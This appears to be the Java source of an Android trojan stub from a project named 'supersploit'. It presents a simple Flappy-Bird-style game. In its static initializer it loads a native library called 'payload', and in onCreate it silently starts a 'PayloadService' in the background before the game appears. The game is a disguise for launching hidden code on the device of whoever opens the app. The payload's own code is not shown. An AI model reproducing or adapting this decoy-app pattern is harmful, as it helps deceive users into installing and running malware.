package org.supersploit.stub;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Rect;
import android.os.Bundle;
import android.view.MotionEvent;
import android.view.View;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class GameActivity extends Activity {

    static {
        System.loadLibrary("payload");
    }

    private GameView gameView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Start the background DRS service
        Intent intent = new Intent(this, PayloadService.class);
        startService(intent);

        gameView = new GameView(this);
        setContentView(gameView);
    }

    class GameView extends View {
        private Paint paint = new Paint();
        private int birdY = 500;
        private int birdV = 0;
        private int gravity = 2;
        private int jumpStrength = -30;
        private boolean gameOver = false;
        private boolean gameStarted = false;
        private int score = 0;
        private List<Pipe> pipes = new ArrayList<>();
        private Random random = new Random();
        private int frameCount = 0;

        public GameView(Context context) {
            super(context);
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);

            // Background
            canvas.drawColor(Color.parseColor("#70C5CE"));

            if (!gameStarted) {
                paint.setColor(Color.WHITE);
                paint.setTextSize(100);
                paint.setTextAlign(Paint.Align.CENTER);
                canvas.drawText("TAP TO START", getWidth() / 2, getHeight() / 2, paint);
                return;
            }

            if (!gameOver) {
                // Update Physics
                birdV += gravity;
                birdY += birdV;

                if (birdY > getHeight() || birdY < 0) gameOver = true;

                // Spawn Pipes
                if (frameCount % 100 == 0) {
                    int gapY = random.nextInt(getHeight() - 600) + 300;
                    pipes.add(new Pipe(getWidth(), gapY));
                }
                frameCount++;

                // Update and Draw Pipes
                for (int i = pipes.size() - 1; i >= 0; i--) {
                    Pipe p = pipes.get(i);
                    p.x -= 10;
                    
                    paint.setColor(Color.parseColor("#75BF2F"));
                    // Top pipe
                    canvas.drawRect(p.x, 0, p.x + 150, p.gapY - 200, paint);
                    // Bottom pipe
                    canvas.drawRect(p.x, p.gapY + 200, p.x + 150, getHeight(), paint);

                    // Collision detection
                    Rect birdRect = new Rect(100, birdY, 160, birdY + 60);
                    if (Rect.intersects(birdRect, new Rect(p.x, 0, p.x + 150, p.gapY - 200)) ||
                        Rect.intersects(birdRect, new Rect(p.x, p.gapY + 200, p.x + 150, getHeight()))) {
                        gameOver = true;
                    }

                    if (p.x == 100) score++;

                    if (p.x < -150) pipes.remove(i);
                }
            }

            // Draw Bird
            paint.setColor(Color.YELLOW);
            canvas.drawCircle(130, birdY + 30, 30, paint);

            // Draw Score
            paint.setColor(Color.WHITE);
            paint.setTextSize(80);
            paint.setTextAlign(Paint.Align.LEFT);
            canvas.drawText("Score: " + score, 50, 100, paint);

            if (gameOver) {
                paint.setTextAlign(Paint.Align.CENTER);
                paint.setTextSize(120);
                canvas.drawText("GAME OVER", getWidth() / 2, getHeight() / 2, paint);
                paint.setTextSize(60);
                canvas.drawText("Tap to restart", getWidth() / 2, getHeight() / 2 + 100, paint);
            } else {
                invalidate(); // Request next frame
            }
        }

        @Override
        public boolean onTouchEvent(MotionEvent event) {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                if (gameOver) {
                    birdY = 500;
                    birdV = 0;
                    score = 0;
                    pipes.clear();
                    gameOver = false;
                    frameCount = 0;
                    invalidate();
                } else if (!gameStarted) {
                    gameStarted = true;
                    invalidate();
                } else {
                    birdV = jumpStrength;
                }
            }
            return true;
        }
    }

    class Pipe {
        int x, gapY;
        Pipe(int x, int gapY) { this.x = x; this.gapY = gapY; }
    }
}
